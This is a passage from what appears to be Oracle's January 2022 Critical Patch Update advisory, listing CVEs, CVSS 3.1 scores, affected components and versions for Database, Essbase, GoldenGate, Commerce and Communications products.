| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-37695 | Oracle Application Express (CKEditor) | Valid User Account | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | Prior to 21.1.4 |  |
| CVE-2022-21393 | Java VM | Create Procedure | Oracle Net | No | 4.3 | Network | Low | Low | None | Un- changed | None | None | Low | 12.1.0.2, 12.2.0.1, 19c, 21c |  |
| CVE-2021-32723 | Oracle Application Express (Prism) | Valid User Account | HTTP | No | 3.5 | Network | Low | Low | Required | Un- changed | None | None | Low | Prior to 21.1.4 |  |
| CVE-2022-21247 | Core RDBMS | Create Session, Execute Catalog Role | Oracle Net | No | 2.7 | Network | Low | High | None | Un- changed | Low | None | None | 12.2.0.1, 19c |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-37695 also addresses CVE-2021-32808 and CVE-2021-32809.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Database Configuration Assistant (Apache Commons Compress): CVE-2021-36090, CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* Oracle Spatial and Graph (Apache Log4j): CVE-2021-45105.
* Trace file analyzer (Apache Log4j): CVE-2021-45105.
* Workload Manager (Guava): CVE-2020-8908.
* Workload Manager (Jetty): CVE-2021-28165, CVE-2021-28169 and CVE-2021-34428.

#### Oracle Airlines Data Model Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Airlines Data Model.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#ADM)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Airlines Data Model | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.0.1.0, 12.1.1.0.0 |  |

#### Oracle Big Data Graph Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle Big Data Graph.  Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#BGDG)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Big Data Spatial and Graph | Big Data Graph (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 23.1 |  |
| CVE-2021-30639 | Big Data Spatial and Graph | Big Data Graph (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 23.1 |  |

#### Oracle Communications Data Model Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Communications Data Model.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#CDM)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Communications Data Model | Utilities (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.3.2.2.0, 12.1.2.0.0, 12.1.0.1.0, 11.3.2.3.0, 11.3.2.1.0 |  |

#### Oracle Essbase Risk Matrix

This Critical Patch Update contains 4 new security patches plus additional third party patches noted below for Oracle Essbase.  3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#ESSB)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-35683 | Oracle Essbase Administration Services | EAS Console | HTTP | No | 9.9 | Network | Low | Low | None | Changed | High | High | High | Prior to 11.1.2.4.047 |  |
| CVE-2021-3711 | Oracle Essbase | Infrastructure (OpenSSL) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 11.1.2.4.047, Prior to 21.3 |  |
| CVE-2021-22901 | Oracle Essbase | Build (cURL) | HTTPS | Yes | 7.5 | Network | High | None | Required | Un- changed | High | High | High | Prior to 11.1.2.4.047, Prior to 21.3 |  |
| CVE-2021-20718 | Oracle Essbase | Infrastructure (mod\_auth\_openidc) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 21.3 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-22901 also addresses CVE-2021-22897 and CVE-2021-22898.
* The patch for CVE-2021-3711 also addresses CVE-2021-3712.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Essbase
  + Infrastructure (Apache Commons Compress): CVE-2021-36090, CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.

#### Oracle GoldenGate Risk Matrix

This Critical Patch Update contains 3 new security patches for Oracle GoldenGate.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#GG)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-23017 | Oracle GoldenGate | GG Market Place for Support (nginx) | UDP | Yes | 9.4 | Network | Low | None | None | Un- changed | High | High | Low | Prior to 21.4.0.0.0 |  |
| CVE-2021-2351 | Oracle GoldenGate | Database (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 21.5.0.0.220118, Prior to 19.1.0.0.220118, Prior to 12.3.0.1 |  |
| CVE-2018-1311 | Oracle GoldenGate | Build Request (Apache Xerces-C++) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | Prior to 21.4.0.0.0 |  |

#### Oracle Graph Server and Client Risk Matrix

This Critical Patch Update contains 2 new security patches plus additional third party patches noted below for Oracle Graph Server and Client.  Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#GSC)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Graph Server and Client | Packaging/install issues (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 21.4 |  |
| CVE-2021-33037 | Oracle Graph Server and Client | Packaging/Install (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Prior to 21.4 |  |

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Graph Server and Client
  + Packaging/Install (Apache Commons IO): CVE-2021-29425.

#### Oracle NoSQL Database Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle NoSQL Database.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#NSQL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-21409 | Oracle NoSQL Database | Administration (Netty) | Local Logon | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | Prior to 21.1.12 |  |

#### Oracle REST Data Services Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle REST Data Services.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#REST)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-28165 | Oracle REST Data Services | General (Eclipse Jetty) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 21.2.0 |  |
| CVE-2021-32014 | Oracle REST Data Services | General (SheetJS) | Local Logon | No | 3.3 | Local | Low | None | Required | Un- changed | None | None | Low | Prior to 21.2.4 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-28165 also addresses CVE-2021-28169 and CVE-2021-34428.
* The patch for CVE-2021-32014 also addresses CVE-2021-32012 and CVE-2021-32013.

#### Oracle Secure Backup Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle Secure Backup.  Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#OSB)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-26691 | Oracle Secure Backup | Oracle Secure Backup (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 18.1.0.1.0 |  |
| CVE-2021-3712 | Oracle Secure Backup | Oracle Secure Backup (OpenSSL) | HTTPS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | Prior to 18.1.0.1.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-26691 also addresses CVE-2021-33193 and CVE-2021-42013.

#### Oracle Spatial Studio Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Spatial Studio.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#SPS)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Spatial Studio | Install (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 21.2.1 |  |

#### Oracle TimesTen In-Memory Database Risk Matrix

This Critical Patch Update contains 5 new security patches for Oracle TimesTen In-Memory Database.  3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#XTEN)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle TimesTen In-Memory Database | EM TimesTen plug-in (JDBC,OCCI) | OracleNet | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 21.1.1.1.0 |  |
| CVE-2021-29923 | Oracle TimesTen In-Memory Database | EM TimesTen plug-in (Go) | TCP/IP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | Prior to 21.1.1.1.0 |  |
| CVE-2021-29923 | Oracle TimesTen In-Memory Database | Install (Go) | TCP/IP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | Prior to 21.1.1.1.0 |  |
| CVE-2020-7712 | Oracle TimesTen In-Memory Database | TimesTen Infrastructure (Apache ZooKeeper) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | Prior to 21.1.1.1.0 |  |
| CVE-2020-11979 | Oracle TimesTen In-Memory Database | Install (Apache Ant) | Local Logon | No | 6.5 | Network | Low | Low | None | Un- changed | None | High | None | Prior to 11.2.2.8.27 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2020-11979 also addresses CVE-2020-1945, CVE-2021-36373 and CVE-2021-36374.
* The patch for CVE-2021-29923 also addresses CVE-2021-34558 and CVE-2021-36221.

#### Oracle Commerce Risk Matrix

This Critical Patch Update contains 6 new security patches for Oracle Commerce.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#OCOM)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Commerce Platform | Dynamo Application Framework (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 11.3.0, 11.3.1, 11.3.2 |  |
| CVE-2021-36090 | Oracle Commerce Guided Search | Content Acquisition System (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 11.3.2 |  |
| CVE-2021-37137 | Oracle Commerce Guided Search | Content Acquisition System (Netty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 11.3.2 |  |
| CVE-2020-13935 | Oracle Commerce Guided Search | Endeca Application Controller (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 11.3.2 |  |
| CVE-2022-21387 | Oracle Commerce Platform | Dynamo Application Framework | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 11.3.0, 11.3.1, 11.3.2 |  |
| CVE-2021-29425 | Oracle Commerce Guided Search | Content Acquisition System (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 11.3.2 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* The patch for CVE-2021-37137 also addresses CVE-2021-37136.

#### Oracle Communications Applications Risk Matrix

This Critical Patch Update contains 33 new security patches for Oracle Communications Applications.  22 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#CAGBU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21275 | Oracle Communications Billing and Revenue Management | Connection Manager | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21389 | Oracle Communications Billing and Revenue Management | Connection Manager | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21390 | Oracle Communications Billing and Revenue Management | Webservices Manager | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21276 | Oracle Communications Billing and Revenue Management | Connection Manager | HTTP | No | 9.9 | Network | Low | Low | None | Changed | High | High | High | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21391 | Oracle Communications Billing and Revenue Management | Connection Manager | HTTP | No | 9.9 | Network | Low | Low | None | Changed | High | High | High | 12.0.0.3, 12.0.0.4 |  |
| CVE-2021-39139 | Oracle Communications BRM - Elastic Charging Engine | Updater (XStream) | TCP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 11.3, 12.0 |  |
| CVE-2021-29505 | Oracle Communications Unified Inventory Management | Rulesets (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 7.3.4, 7.3.5, 7.4.0, 7.4.1, 7.4.2 |  |
| CVE-2021-2351 | Oracle Communications Calendar Server | Administration (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.0.5.0 |  |
| CVE-2021-2351 | Oracle Communications Contacts Server | Database (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.0.3.0 |  |
| CVE-2021-2351 | Oracle Communications Convergent Charging Controller | ACS (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0 |  |
| CVE-2021-2351 | Oracle Communications Design Studio | OSM, NI Plugins (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.3.5, 7.4.0, 7.4.1, 7.4.2 |  |
| CVE-2021-2351 | Oracle Communications Network Charging and Control | ACS (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0 |  |
| CVE-2021-2351 | Oracle Communications Network Integrity | Installer (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.3.5, 7.3.6 |  |
| CVE-2020-28052 | Oracle Communications Convergence | Messaging (Bouncy Castle Java Library) | S/MIME | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 3.0.2.2.0 |  |
| CVE-2020-24750 | Oracle Communications Instant Messaging Server | PresenceApi (jackson-databind) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 10.0.1.5.0 |  |
| CVE-2020-24750 | Oracle Communications Offline Mediation Controller | Installer (jackson-databind) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 12.0.0.3 |  |
| CVE-2020-24750 | Oracle Communications Pricing Design Center | Installation (jackson-databind) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 12.0.0.4.0 |  |
| CVE-2021-22118 | Oracle Communications Unified Inventory Management | TMF API (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 7.4.1, 7.4.2, 7.5.0 |  |
| CVE-2022-21266 | Oracle Communications Billing and Revenue Management | Pipeline Manager | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 12.0.0.3, 12.0.0.4 |  |
| CVE-2021-25122 | Oracle Communications Instant Messaging Server | DBPlugin (Apache Tomcat) | XMPP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 10.0.1.5.0 |  |
| CVE-2021-37714 | Oracle Communications Messaging Server | ISC (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.1 |  |
| CVE-2021-36090 | Oracle Communications Unified Inventory Management | Inventory Organizer (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 7.4.0, 7.4.1, 7.4.2, 7.5.0 |  |
| CVE-2019-10086 | Oracle Communications Convergence | Message Store (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 3.0.2.2.0 |  |
| CVE-2019-10086 | Oracle Communications Design Studio | Inventory (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 7.3.4, 7.3.5, 7.4.0 |  |
| CVE-2020-5421 | Oracle Communications Design Studio | Inventory (Spring Framework) | HTTP | No | 6.5 | Network | High | Low | Required | Changed | Low | High | None | 7.3.4, 7.3.5, 7.4.0 |  |
| CVE-2021-36374 | Oracle Communications Unified Inventory Management | Build Tool (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 7.3.0, 7.4.0, 7.4.1, 7.4.2, 7.5.0 |  |
| CVE-2021-29425 | Oracle Communications BRM - Elastic Charging Engine | Charging Controller (Apache Commons IO) | TCP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.0 |  |
| CVE-2021-29425 | Oracle Communications Convergence | Convergence Server (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 3.0.2.2.0 |  |
| CVE-2021-29425 | Oracle Communications Offline Mediation Controller | Installation (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.0.0.3 |  |
| CVE-2022-21338 | Oracle Communications Convergence | General Framework | HTTP | No | 4.6 | Network | Low | Low | Required | Un- changed | Low | Low | None | 3.0.2.2.0 |  |
| CVE-2022-21267 | Oracle Communications Billing and Revenue Management | Pipeline Manager | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21268 | Oracle Communications Billing and Revenue Management | Pipeline Manager | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 12.0.0.3, 12.0.0.4 |  |
| CVE-2022-21388 | Oracle Communications Pricing Design Center | On Premise Install | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 12.0.0.3.0, 12.0.0.4.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2020-24750 also addresses CVE-2020-24616, CVE-2020-25649 and CVE-2020-36189.
* The patch for CVE-2021-25122 also addresses CVE-2020-13934, CVE-2020-13935, CVE-2020-17527, CVE-2021-25329 and CVE-2021-33037.
* The patch for CVE-2021-29505 also addresses CVE-2021-39154.
* The patch for CVE-2021-39139 also addresses CVE-2021-29505, CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39153 and CVE-2021-39154.

#### Oracle Communications Risk Matrix

This Critical Patch Update contains 84 new security patches plus additional third party patches noted below for Oracle Communications.  50 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#CGBU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-23440 | Oracle Communications Cloud Native Core Policy | Policy (set-value) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-21783 | Oracle Communications EAGLE Application Processor | Platform (gSOAP) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 16.1-16.4 |  |
| CVE-2021-32827 | Oracle Communications Cloud Native Core Policy | Policy (MockServer) | HTTP | Yes | 9.6 | Network | Low | None | Required | Changed | High | High | High | 1.14.0 |  |
| CVE-2021-27568 | Oracle Communications Cloud Native Core Policy | Policy (netplex json-smart) | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | None | High | 1.14.0 |  |
| CVE-2021-39139 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 1.10.0 |  |
| CVE-2019-13734 | Oracle Communications Cloud Native Core Network Repository Function | NRF (SQLite) | HTTP | Yes | 8.8 | Network | Low | None | Required | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2020-13936 | Oracle Communications Cloud Native Core Policy | Policy (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2020-15824 | Oracle Communications Cloud Native Core Policy | Policy (Kotlin) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2020-10878 | Oracle Communications EAGLE Application Processor | Platform (Perl) | HTTP | Yes | 8.6 | Network | Low | None | None | Un- changed | Low | Low | High | 16.1-16.4 |  |
| CVE-2021-39153 | Oracle Communications Cloud Native Core Policy | Signaling (XStream) | HTTP | No | 8.5 | Network | High | Low | None | Changed | High | High | High | 1.14.0 |  |
| CVE-2020-36189 | Oracle Communications Cloud Native Core Policy | Policy (jackson-databind) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-22118 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.9.0 |  |
| CVE-2021-22118 | Oracle Communications Cloud Native Core Policy | Policy (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-22118 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.6.0 |  |
| CVE-2021-22118 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-22118 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-33909 | Oracle Communications Session Border Controller | Core (Kernel) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 8.2, 8.3, 8.4, 9.0 |  |
| CVE-2022-21382 | Oracle Enterprise Session Border Controller | WebUI | HTTP | No | 7.7 | Network | Low | Low | None | Changed | None | High | None | 8.4, 9.0 |  |
| CVE-2020-17527 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.10.0 |  |
| CVE-2021-37137 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Netty) | TCP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.10.0 |  |
| CVE-2021-33560 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | Configuration (libgcrypt) | TCP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.9.0 |  |
| CVE-2020-13949 | Oracle Communications Cloud Native Core Policy | Policy (Apache Thrift) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
